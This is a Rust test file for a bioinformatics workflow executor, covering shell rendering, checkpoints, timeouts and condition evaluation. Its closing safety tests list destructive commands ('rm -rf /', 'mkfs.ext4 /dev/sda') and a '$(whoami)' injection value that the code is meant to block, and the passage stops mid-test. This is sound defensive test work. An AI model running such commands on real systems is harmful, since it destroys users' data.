use super::checkpoint::*;
use super::process::*;
use super::security::*;
use crate::rule::{EnvironmentSpec, FilePatterns, Resources, Rule, RuleBuilder};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

fn make_rule(name: &str, shell: &str) -> Rule {
    Rule {
        name: name.to_string(),
        input: vec![].into(),
        output: vec![].into(),
        shell: Some(shell.to_string()),
        script: None,
        resources: Resources::default(),
        environment: EnvironmentSpec::default(),
        log: None,
        benchmark: None,
        params: HashMap::new(),
        priority: 0,
        target: false,
        group: None,
        description: None,
        ..Default::default()
    }
}

/// Fixed machine limits for render_shell_command tests.
const TEST_LIMITS: crate::scheduler::ResourceLimits = crate::scheduler::ResourceLimits {
    threads: 8,
    memory_mb: 16384,
};

#[test]
fn job_status_display() {
    assert_eq!(JobStatus::Pending.to_string(), "pending");
    assert_eq!(JobStatus::Running.to_string(), "running");
    assert_eq!(JobStatus::Success.to_string(), "success");
    assert_eq!(JobStatus::Failed.to_string(), "failed");
    assert_eq!(JobStatus::Skipped.to_string(), "skipped");
}

#[test]
fn dry_run_rules() {
    let config = ExecutorConfig {
        dry_run: true,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rules = vec![
        make_rule("step1", "echo hello"),
        make_rule("step2", "echo world"),
    ];

    let records = executor.dry_run_rules(&rules);
    assert_eq!(records.len(), 2);
    assert_eq!(records[0].status, JobStatus::Skipped);
    assert_eq!(records[1].status, JobStatus::Skipped);
}

#[tokio::test]
async fn execute_echo() {
    let config = ExecutorConfig {
        max_jobs: 2,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("echo_test", "echo hello_oxoflow");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(record.stdout.unwrap().contains("hello_oxoflow"));
}

#[tokio::test]
async fn execute_creates_config_var_output_dirs() {
    let workdir = std::env::temp_dir().join(format!("oxo-outdir-test-{}", std::process::id()));
    let _ = tokio::fs::remove_dir_all(&workdir).await;
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: workdir.clone(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("outdir_test", "echo hi > {output}");
    rule.output = FilePatterns::List(vec!["{config.results_dir}/nested/hello.txt".to_string()]);
    let mut values = HashMap::new();
    values.insert("config.results_dir".to_string(), "out".to_string());

    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    // The literal {config.results_dir} directory must NOT be created;
    // the expanded path must.
    assert!(workdir.join("out/nested/hello.txt").exists());
    assert!(!workdir.join("{config.results_dir}").exists());

    let _ = tokio::fs::remove_dir_all(&workdir).await;
}

#[tokio::test]
async fn execute_dry_run() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: true,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("dry_test", "echo should_not_run");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
}

/// Sampled CPU metering reaches JobRecord (issue #83 P1-13): a busy shell
/// loop must accumulate positive CPU seconds (bounded by wall time), and
/// a rule skipped by its `when` condition stays `None` — it never spawns.
#[tokio::test]
async fn execute_records_sampled_cpu_seconds() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    // Busy loop, ~1-2 s of CPU on both bash (macOS) and dash (Linux CI):
    // long enough to span several sampler ticks so the sampled value is
    // reliably non-zero.
    let busy = make_rule("busy", "i=0; while [ $i -lt 800000 ]; do i=$((i+1)); done");
    let record = executor.execute_rule(&busy, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let cpu = record
        .cpu_seconds
        .expect("busy rule must accumulate sampled CPU seconds");
    // `>= 0.0`, not `> 0.0`: under pathological scheduler starvation the
    // per-tick percent truncation could land on Some(0.0) — the ~1 s loop
    // makes zero unlikely, but the assertion must not flake on it.
    assert!(cpu >= 0.0, "sampled CPU must be non-negative, got {cpu}s");
    let wall_secs = record
        .finished_at
        .and_then(|f| record.started_at.map(|s| f.signed_duration_since(s)))
        .expect("executed rule must have timestamps")
        .num_milliseconds() as f64
        / 1000.0;
    // Threads sanity: even multi-core overshoot cannot exceed 32× wall time.
    assert!(cpu <= wall_secs * 32.0, "CPU {cpu}s vs wall {wall_secs}s");

    let mut skipped = make_rule("skipped", "echo never");
    skipped.when = Some("false".to_string());
    let record = executor
        .execute_rule(&skipped, &HashMap::new())
        .await
        .unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
    assert_eq!(record.cpu_seconds, None);
}

#[tokio::test]
async fn execute_failing_command() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: true,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("fail_test", "exit 42");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Failed);
    assert_eq!(record.exit_code, Some(42));
}

#[tokio::test]
async fn execute_shell_exits_zero_but_outputs_missing() {
    let tmp = std::env::temp_dir().join("oxo_test_output_validation");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    // Rule declares an output but shell just runs "true" (exits 0, creates nothing).
    let rule = RuleBuilder::new("missing_output_test")
        .shell("true")
        .output(vec!["should_exist.txt".to_string()])
        .build();

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Failed,
        "rule should fail when declared outputs are missing, even if shell exits 0"
    );
    assert_eq!(record.exit_code, Some(-1));
    assert!(
        record
            .stderr
            .as_ref()
            .is_some_and(|s| s.contains("output validation failed"))
    );
    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp);
}

#[tokio::test]
async fn execute_shell_creates_outputs_succeeds() {
    let tmp = std::env::temp_dir().join("oxo_test_output_validation_ok");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = RuleBuilder::new("output_ok_test")
        .shell("echo done > output.txt")
        .output(vec!["output.txt".to_string()])
        .build();

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Success,
        "rule should succeed when shell exits 0 and outputs exist"
    );
    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp);
}

#[tokio::test]
async fn execute_wildcard_expansion() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("wildcard_test", "echo {sample}");

    let mut values = HashMap::new();
    values.insert("sample".to_string(), "TUMOR_01".to_string());

    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(record.stdout.unwrap().contains("TUMOR_01"));
}

#[test]
fn render_shell_command_named_io() {
    let mut named_input = HashMap::new();
    named_input.insert("reads".to_string(), "data.fq".to_string());
    let mut named_output = HashMap::new();
    named_output.insert("bam".to_string(), "sorted.bam".to_string());

    let rule = RuleBuilder::new("align")
        .input(named_input)
        .output(named_output)
        .build();

    let result = render_shell_command(
        "bwa mem {input.reads} > {output.bam}",
        &rule,
        &HashMap::new(),
        TEST_LIMITS,
    );
    assert_eq!(result, "bwa mem data.fq > sorted.bam");
}

#[test]
fn render_shell_output_indexed() {
    let rule = Rule {
        name: "test".to_string(),
        input: vec!["in.txt".to_string()].into(),
        output: vec!["out.txt".to_string(), "out2.txt".to_string()].into(),
        shell: None,
        ..Default::default()
    };
    let result = render_shell_command(
        "cat {input[0]} > {output[0]}",
        &rule,
        &HashMap::new(),
        TEST_LIMITS,
    );
    assert_eq!(result, "cat in.txt > out.txt");
}

#[test]
fn render_shell_output_all() {
    let rule = Rule {
        name: "test".to_string(),
        input: vec!["a.txt".to_string(), "b.txt".to_string()].into(),
        output: vec!["out.txt".to_string()].into(),
        shell: None,
        ..Default::default()
    };
    let result = render_shell_command(
        "cat {input} > {output}",
        &rule,
        &HashMap::new(),
        TEST_LIMITS,
    );
    assert_eq!(result, "cat a.txt b.txt > out.txt");
}

#[test]
fn render_shell_threads() {
    let rule = Rule {
        name: "test".to_string(),
        resources: Resources {
            threads: 8,
            ..Default::default()
        },
        output: vec!["out.bam".to_string()].into(),
        ..Default::default()
    };
    let result = render_shell_command(
        "bwa mem -t {threads} ref.fa > {output[0]}",
        &rule,
        &HashMap::new(),
        TEST_LIMITS,
    );
    assert_eq!(result, "bwa mem -t 8 ref.fa > out.bam");
}

#[test]
fn render_shell_config_values() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["hello.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("config.reference".to_string(), "/data/ref.fa".to_string());
    let result = render_shell_command(
        "bwa mem {config.reference} > {output[0]}",
        &rule,
        &values,
        TEST_LIMITS,
    );
    assert_eq!(result, "bwa mem /data/ref.fa > hello.txt");
}

#[test]
fn render_shell_command_nested_config() {
    // Nested `{config.x}` references must resolve to a fixed point,
    // independent of HashMap iteration order.
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.bam".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert(
        "config.reference_dir".to_string(),
        "/data/refs/GRCh38".to_string(),
    );
    values.insert(
        "config.reference_fasta".to_string(),
        "{config.reference_dir}/genome.fa".to_string(),
    );
    let result = render_shell_command(
        "bwa mem {config.reference_fasta} > {output[0]}",
        &rule,
        &values,
        TEST_LIMITS,
    );
    assert_eq!(result, "bwa mem /data/refs/GRCh38/genome.fa > out.bam");
}

#[test]
fn render_shell_command_three_level_nested_config() {
    // Three levels of nesting exercise multi-pass convergence.
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("config.a".to_string(), "{config.b}".to_string());
    values.insert("config.b".to_string(), "{config.c}".to_string());
    values.insert("config.c".to_string(), "/final".to_string());
    let result = render_shell_command("cp {config.a} {output[0]}", &rule, &values, TEST_LIMITS);
    assert_eq!(result, "cp /final out.txt");
}

#[test]
fn expand_config_in_path_nested() {
    let mut values = HashMap::new();
    values.insert("config.dir".to_string(), "/data/out".to_string());
    values.insert(
        "config.subdir".to_string(),
        "{config.dir}/sample".to_string(),
    );
    let result = expand_config_in_path("{config.subdir}/file.txt", &values);
    assert_eq!(result, "/data/out/sample/file.txt");
}

#[test]
fn expand_to_fixed_point_cyclic_reference_terminates() {
    // A cyclic reference never converges; the helper must still terminate
    // (capped iterations) rather than loop forever. The exact best-effort
    // result depends on map iteration order, so assert only membership.
    let mut values = HashMap::new();
    values.insert("config.a".to_string(), "{config.b}".to_string());
    values.insert("config.b".to_string(), "{config.a}".to_string());
    let result = super::expand_to_fixed_point("{config.a}", &values, |value| value.to_owned());
    assert!(result == "{config.a}" || result == "{config.b}");
}

#[test]
fn expand_to_fixed_point_self_reference_terminates() {
    // `a = "{a}"` substitutes to itself; the loop must detect "no change"
    // and return instead of spinning.
    let mut values = HashMap::new();
    values.insert("config.a".to_string(), "{config.a}".to_string());
    let result = super::expand_to_fixed_point("{config.a}", &values, |value| value.to_owned());
    assert_eq!(result, "{config.a}");
}

#[tokio::test]
async fn execute_output_index_expansion() {
    let tmp = std::env::temp_dir().join("oxo_test_output_index");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "output_test".to_string(),
        input: vec![].into(),
        output: vec!["hello_output.txt".to_string()].into(),
        shell: Some("touch {output[0]} && echo hello_oxoflow_{output[0]}".to_string()),
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let stdout = record.stdout.unwrap();
    assert!(
        stdout.contains("hello_oxoflow_hello_output.txt"),
        "stdout was: {stdout}"
    );
    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn benchmark_record_creation() {
    let b = BenchmarkRecord {
        rule: "fastqc".to_string(),
        wall_time_secs: 42.5,
        max_memory_mb: Some(1024),
        memory_limit_mb: None,
        retries: 0,
        cpu_seconds: Some(38.0),
    };
    assert_eq!(b.rule, "fastqc");
    assert!((b.wall_time_secs - 42.5).abs() < f64::EPSILON);
    assert_eq!(b.max_memory_mb, Some(1024));
    assert_eq!(b.cpu_seconds, Some(38.0));
}

#[test]
fn checkpoint_mark_completed() {
    let mut state = CheckpointState::new();
    let bench = BenchmarkRecord {
        rule: "step1".to_string(),
        wall_time_secs: 5.0,
        max_memory_mb: None,
        memory_limit_mb: None,
        retries: 0,
        cpu_seconds: None,
    };
    state.mark_completed("step1", bench);
    assert!(state.is_completed("step1"));
    assert!(state.should_skip("step1"));
    assert!(!state.failed_rules.contains("step1"));
}

#[test]
fn checkpoint_mark_failed() {
    let mut state = CheckpointState::new();
    state.mark_failed("step2");
    assert!(!state.is_completed("step2"));
    assert!(!state.should_skip("step2"));
    assert!(state.failed_rules.contains("step2"));
}

#[test]
fn checkpoint_json_round_trip() {
    let mut state = CheckpointState::new();
    state.mark_completed(
        "align",
        BenchmarkRecord {
            rule: "align".to_string(),
            wall_time_secs: 120.0,
            max_memory_mb: Some(8192),
            memory_limit_mb: None,
            retries: 0,
            cpu_seconds: Some(110.0),
        },
    );
    state.mark_failed("variant_call");

    let json = state.to_json().unwrap();
    let restored = CheckpointState::from_json(&json).unwrap();

    assert!(restored.is_completed("align"));
    assert!(restored.failed_rules.contains("variant_call"));
}

#[test]
fn checkpoint_record_run_persists_diagnostics() {
    let mut state = CheckpointState::new();
    let record = JobRecord {
        rule: "call".to_string(),
        status: JobStatus::Failed,
        started_at: None,
        finished_at: None,
        exit_code: Some(127),
        stdout: None,
        stderr: Some("gatk: command not found".to_string()),
        command: Some("gatk HaplotypeCaller -I out.bam".to_string()),
        retries: 0,
        timeout: None,
        skip_reason: None,
        max_rss_mb: None,
        cpu_seconds: None,
    };
    state.record_run(&record);
    state.mark_failed("call");

    // Round-trips through JSON so legacy/forward compatibility is covered.
    let json = state.to_json().unwrap();
    let restored = CheckpointState::from_json(&json).unwrap();
    let run = restored.rule_runs.get("call").unwrap();
    assert_eq!(run.exit_code, Some(127));
    assert_eq!(
        run.command.as_deref(),
        Some("gatk HaplotypeCaller -I out.bam")
    );
    assert_eq!(run.stderr_tail.as_deref(), Some("gatk: command not found"));
}

#[test]
fn checkpoint_stderr_tail_is_bounded() {
    let mut state = CheckpointState::new();
    let long = "x".repeat(10_000);
    let record = JobRecord {
        rule: "noisy".to_string(),
        status: JobStatus::Failed,
        started_at: None,
        finished_at: None,
        exit_code: Some(1),
        stdout: None,
        stderr: Some(long),
        command: None,
        retries: 0,
        timeout: None,
        skip_reason: None,
        max_rss_mb: None,
        cpu_seconds: None,
    };
    state.record_run(&record);
    let tail = state.rule_runs["noisy"].stderr_tail.as_deref().unwrap();
    assert!(tail.starts_with('…'));
    // 2048 chars of content + the "…\n" truncation marker.
    assert!(tail.chars().count() <= 2048 + 2, "tail must stay bounded");
}

#[test]
fn file_is_newer_with_real_files() {
    let dir = tempfile::tempdir().unwrap();
    let older = dir.path().join("older.txt");
    let newer = dir.path().join("newer.txt");

    std::fs::write(&older, "old").unwrap();
    std::thread::sleep(std::time::Duration::from_millis(50));
    std::fs::write(&newer, "new").unwrap();

    assert!(file_is_newer(&newer, &older));
    assert!(!file_is_newer(&older, &newer));
}

#[tokio::test]
async fn execute_with_timeout() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: true,
        retry_count: 0,
        timeout: Some(std::time::Duration::from_millis(100)),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("timeout_test", "sleep 30");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::TimedOut);
    assert!(record.stderr.unwrap().contains("timed out"));
}

#[test]
fn evaluate_condition_complex_expression() {
    let mut config = HashMap::new();
    config.insert("run_qc".to_string(), toml::Value::Boolean(true));
    config.insert("threads".to_string(), toml::Value::Integer(8));
    config.insert(
        "mode".to_string(),
        toml::Value::String("tumor_normal".to_string()),
    );

    assert!(evaluate_condition(
        r#"config.run_qc == true && config.threads >= 4 && config.mode == "tumor_normal""#,
        &config
    ));
}

#[test]
fn evaluate_condition_len_empty_array_issue_252() {
    // Issue #252: `config.<key>` truthiness is `Some(_) => true` for arrays,
    // so an empty array could not gate "list is non-empty". `len()` is the
    // additive escape hatch — empty-array truthiness stays untouched.
    let mut config = HashMap::new();
    config.insert(
        "gene_sets".to_string(),
        toml::Value::Array(vec![toml::Value::String("hallmark".into())]),
    );
    config.insert("empty_sets".to_string(), toml::Value::Array(vec![]));
    config.insert("samples".to_string(), toml::Value::String("abc".into()));

    // The reported gap: an empty array is truthy, so this never gated.
    assert!(
        evaluate_condition("config.empty_sets", &config),
        "array truthiness unchanged (Some(_) => true)"
    );
    // len() separates empty from non-empty.
    assert!(!evaluate_condition("len(config.empty_sets) > 0", &config));
    assert!(evaluate_condition("len(config.gene_sets) > 0", &config));
    assert!(evaluate_condition("len(config.gene_sets) >= 1", &config));
    assert!(evaluate_condition("len(config.gene_sets) == 1", &config));
    assert!(!evaluate_condition("len(config.gene_sets) == 2", &config));
    assert!(evaluate_condition("len(config.gene_sets) != 0", &config));
    // Bare len(): non-empty value.
    assert!(evaluate_condition("len(config.gene_sets)", &config));
    assert!(!evaluate_condition("len(config.empty_sets)", &config));
    // Strings count chars.
    assert!(evaluate_condition("len(config.samples) == 3", &config));
    // Absent key: 0 elements — len(...) == 0 is true, len(...) > 0 false.
    assert!(evaluate_condition("len(config.missing) == 0", &config));
    assert!(!evaluate_condition("len(config.missing) > 0", &config));
    // Non-length types (bool/number): no length — every comparison false,
    // bare len() false.
    config.insert("flag".to_string(), toml::Value::Boolean(true));
    assert!(!evaluate_condition("len(config.flag) > 0", &config));
    // Composes with the rest of the vocabulary.
    config.insert("run_qc".to_string(), toml::Value::Boolean(true));
    assert!(evaluate_condition(
        "len(config.gene_sets) > 0 && config.run_qc != false",
        &config
    ));
}

#[test]
fn evaluate_condition_with_config_prefix() {
    let mut config = HashMap::new();
    config.insert("mode".to_string(), toml::Value::String("dna".to_string()));
    config.insert(
        "min_qual".to_string(),
        toml::Value::String("30".to_string()),
    );

    // Bare key reference (truthiness)
    assert!(
        evaluate_condition("config.mode", &config),
        "truthy config.mode"
    );
    assert!(
        !evaluate_condition("config.missing", &config),
        "falsy config.missing"
    );

    // Equality comparison
    assert!(evaluate_condition(r#"config.mode == "dna""#, &config));
    assert!(!evaluate_condition(r#"config.mode == "rna""#, &config));

    // Equality with string value
    assert!(evaluate_condition(r#"config.min_qual == "30""#, &config));
    assert!(!evaluate_condition(r#"config.min_qual == "20""#, &config));

    // Mixed conditions
    config.insert("paired".to_string(), toml::Value::Boolean(true));
    assert!(evaluate_condition(
        r#"config.paired == true && config.mode == "dna""#,
        &config
    ));
}

#[test]
fn evaluate_condition_typed_integer_comparison() {
    let mut config = HashMap::new();
    config.insert("min_qual".to_string(), toml::Value::Integer(30));
    config.insert("threads".to_string(), toml::Value::Integer(8));

    assert!(evaluate_condition("config.min_qual == 30", &config));
    assert!(!evaluate_condition("config.min_qual == 20", &config));
    assert!(evaluate_condition("config.min_qual >= 20", &config));
    assert!(evaluate_condition("config.min_qual <= 30", &config));
    assert!(evaluate_condition("config.min_qual > 10", &config));
    assert!(evaluate_condition("config.min_qual < 50", &config));
    assert!(!evaluate_condition("config.min_qual >= 50", &config));
    assert!(evaluate_condition(
        "config.min_qual >= 20 && config.threads >= 4",
        &config
    ));
}

#[test]
fn evaluate_condition_typed_float_comparison() {
    let mut config = HashMap::new();
    config.insert("threshold".to_string(), toml::Value::Float(1e-5));

    assert!(evaluate_condition("config.threshold == 0.00001", &config));
    assert!(!evaluate_condition("config.threshold == 0.001", &config));
    assert!(evaluate_condition("config.threshold < 0.001", &config));
    assert!(evaluate_condition("config.threshold > 1e-10", &config));
}

#[test]
fn evaluate_condition_wildcard_context_unpaired_control() {
    use super::process::evaluate_condition_with_wildcards;

    let config = HashMap::new();
    let mut combo = HashMap::new();
    combo.insert("pair_id".to_string(), "mini".to_string());
    combo.insert("control".to_string(), String::new());

    assert!(!evaluate_condition_with_wildcards(
        "wildcard.control != ''",
        &config,
        &combo
    ));
    assert!(evaluate_condition_with_wildcards(
        "wildcard.control == ''",
        &config,
        &combo
    ));
    assert!(evaluate_condition_with_wildcards(
        "wildcard.pair_id == 'mini' && wildcard.control == ''",
        &config,
        &combo
    ));
}

#[test]
fn evaluate_condition_wildcard_context_paired_control() {
    use super::process::evaluate_condition_with_wildcards;

    let config = HashMap::new();
    let mut combo = HashMap::new();
    combo.insert("pair_id".to_string(), "mini".to_string());
    combo.insert("control".to_string(), "mini-NC".to_string());

    assert!(evaluate_condition_with_wildcards(
        "wildcard.control != ''",
        &config,
        &combo
    ));
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.control == ''",
        &config,
        &combo
    ));
    // config and wildcard scopes compose
    let mut config2 = HashMap::new();
    config2.insert("cnv_enabled".to_string(), toml::Value::Boolean(true));
    assert!(evaluate_condition_with_wildcards(
        "config.cnv_enabled && wildcard.control != ''",
        &config2,
        &combo
    ));
}

#[test]
fn evaluate_condition_wildcard_context_missing_key_is_false() {
    use super::process::evaluate_condition_with_wildcards;

    // An unbound wildcard key cannot meet the condition: every operator
    // evaluates false (issue #85 — snparcher's
    // `when = "wildcard.input_type == 'srr'"` fired for a fastq cohort
    // with no `input_type` binding and ran `download_sra` against a
    // literal `{accession}`).
    let config = HashMap::new();
    let empty = HashMap::new();
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.control != ''",
        &config,
        &empty
    ));
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.unknown_key == 'x'",
        &config,
        &empty
    ));
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.unknown_key != 'x'",
        &config,
        &empty
    ));
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.unknown_key > '1'",
        &config,
        &empty
    ));
    // Bare truthiness of an unbound key is false too (matches
    // `config.missing`), and a bound key still works.
    assert!(!evaluate_condition_with_wildcards(
        "wildcard.unknown_key",
        &config,
        &empty
    ));
    let mut combo = HashMap::new();
    combo.insert("unknown_key".to_string(), "x".to_string());
    assert!(evaluate_condition_with_wildcards(
        "wildcard.unknown_key",
        &config,
        &combo
    ));
    assert!(evaluate_condition_with_wildcards(
        "wildcard.unknown_key == 'x'",
        &config,
        &combo
    ));
}

#[test]
fn file_exists_resolves_against_base_dir_not_cwd() {
    use super::process::evaluate_condition_with_wildcards_and_base_dir;

    // Issue #241: relative `file_exists(...)` paths must resolve against the
    // workflow root (base_dir) — the same root every other engine path uses —
    // not the engine process's current working directory.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("panel.bed"), b"chr1\t1\t100").unwrap();
    let config = HashMap::new();
    let empty = HashMap::new();

    // Absolute path: base_dir is irrelevant.
    let abs = dir.path().join("panel.bed");
    assert!(evaluate_condition_with_wildcards_and_base_dir(
        &format!(r#"file_exists("{}")"#, abs.display()),
        &config,
        &empty,
        Some(dir.path().join("elsewhere").as_path())
    ));

    // Relative path: resolves under base_dir, NOT process cwd.
    assert!(
        evaluate_condition_with_wildcards_and_base_dir(
            r#"file_exists("panel.bed")"#,
            &config,
            &empty,
            Some(dir.path())
        ),
        "relative path must resolve against base_dir"
    );
    assert!(
        !evaluate_condition_with_wildcards_and_base_dir(
            r#"file_exists("panel.bed")"#,
            &config,
            &empty,
            Some(dir.path().join("nonexistent-root").as_path())
        ),
        "missing root must close the gate"
    );

    // None keeps the historical process-cwd behavior.
    let cwd_relative = std::env::current_dir().expect("cwd available in tests");
    let probe = cwd_relative.join(format!(".oxo-file-exists-probe-{}", std::process::id()));
    std::fs::write(&probe, b"probe").unwrap();
    let present = evaluate_condition_with_wildcards_and_base_dir(
        &format!(r#"file_exists("{}")"#, probe.display()),
        &config,
        &empty,
        None,
    );
    let _ = std::fs::remove_file(&probe);
    assert!(present, "None must keep cwd-relative resolution");

    // Composes inside && / !.
    assert!(evaluate_condition_with_wildcards_and_base_dir(
        r#"file_exists("panel.bed") && !file_exists("missing.bed")"#,
        &config,
        &empty,
        Some(dir.path())
    ));
}

#[test]
fn evaluate_condition_literal_comparisons_compare_for_real() {
    use super::process::evaluate_condition_with_wildcards;

    // Expansion-time when baking substitutes per-instance wildcard values
    // into the kept rule's `when` as quoted literals; the execution-time
    // re-check must compare them properly (including under `!`).
    let config = HashMap::new();
    let empty = HashMap::new();
    assert!(evaluate_condition_with_wildcards(
        "'srr' == 'srr'",
        &config,
        &empty
    ));
    assert!(!evaluate_condition_with_wildcards(
        "'srr' == 'fastq'",
        &config,
        &empty
    ));
    assert!(evaluate_condition_with_wildcards(
        "'srr' != 'fastq'",
        &config,
        &empty
    ));
    assert!(evaluate_condition_with_wildcards(
        "'2' > '1' && '1' <= '2'",
        &config,
        &empty
    ));
    assert!(!evaluate_condition_with_wildcards(
        "!('srr' == 'srr')",
        &config,
        &empty
    ));
    // Baked wildcard parts compose with config predicates.
    let mut config = HashMap::new();
    config.insert("gate".to_string(), toml::Value::Boolean(true));
    assert!(evaluate_condition_with_wildcards(
        "config.gate && 'srr' == 'srr'",
        &config,
        &empty
    ));
    config.insert("gate".to_string(), toml::Value::Boolean(false));
    assert!(!evaluate_condition_with_wildcards(
        "config.gate && 'srr' == 'srr'",
        &config,
        &empty
    ));
}

#[tokio::test]
async fn execute_rule_skipped_when_wildcard_key_unbound() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);

    // A `when` referencing a wildcard key with no binding cannot be met:
    // the rule is skipped (never executed) for every operator — ==, !=, >.
    for condition in [
        r#"wildcard.missing == "x""#,
        r#"wildcard.missing != "x""#,
        "wildcard.missing > '1'",
    ] {
        let mut rule = make_rule("unbound_when", "echo never");
        rule.when = Some(condition.to_string());
        let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
        assert_eq!(
            record.status,
            JobStatus::Skipped,
            "condition {condition:?} with an unbound wildcard key must skip the rule"
        );
        assert_eq!(
            record.skip_reason.as_deref(),
            Some("condition evaluated to false")
        );
    }

    // A bound wildcard key still gates normally: matching value runs,
    // non-matching value skips.
    let mut rule = make_rule("bound_when", "echo hi");
    rule.when = Some(r#"wildcard.k == "v""#.to_string());
    let mut values = HashMap::new();
    values.insert("k".to_string(), "v".to_string());
    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Success,
        "bound wildcard.k == 'v' must run"
    );

    let mut values = HashMap::new();
    values.insert("k".to_string(), "other".to_string());
    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Skipped,
        "bound wildcard.k == 'v' with k = 'other' must skip"
    );
}

#[test]
fn validate_shell_safety_blocks_dangerous_deletion() {
    assert!(validate_shell_safety("rm -rf /").is_err());
}

#[test]
fn validate_wildcard_injection_blocks_command_substitution() {
    let mut values = HashMap::new();
    values.insert("sample".to_string(), "$(whoami)".to_string());
    assert!(validate_wildcard_injection(&values, &HashMap::new()).is_err());
}

// ---------------------------------------------------------------------------
// validate_shell_safety — bypass attempt tests
// ---------------------------------------------------------------------------

#[test]
fn validate_shell_safety_blocks_rm_rf_with_no_preserve_root() {
    assert!(
        validate_shell_safety("rm -rf --no-preserve-root /").is_err(),
        "should block rm -rf --no-preserve-root /"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_extra_spaces() {
    assert!(
        validate_shell_safety("rm  -rf  /").is_err(),
        "should block rm  -rf  / (extra spaces)"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_home_data() {
    assert!(
        validate_shell_safety("rm -rf ~/data").is_err(),
        "should block rm -rf ~/data"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_tilde() {
    assert!(
        validate_shell_safety("rm -rf ~").is_err(),
        "should block rm -rf ~"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_r_root() {
    assert!(
        validate_shell_safety("rm -r /").is_err(),
        "should block rm -r /"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_ext4() {
    assert!(
        validate_shell_safety("mkfs.ext4 /dev/sda").is_err(),
        "should block mkfs.ext4 /dev/sda"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_btrfs() {
    assert!(
        validate_shell_safety("mkfs.btrfs /dev/sdb1").is_err(),
        "should block mkfs.btrfs"
    );
}

#[test]
fn validate_shell_safety_blocks_mkswap() {
    assert!(
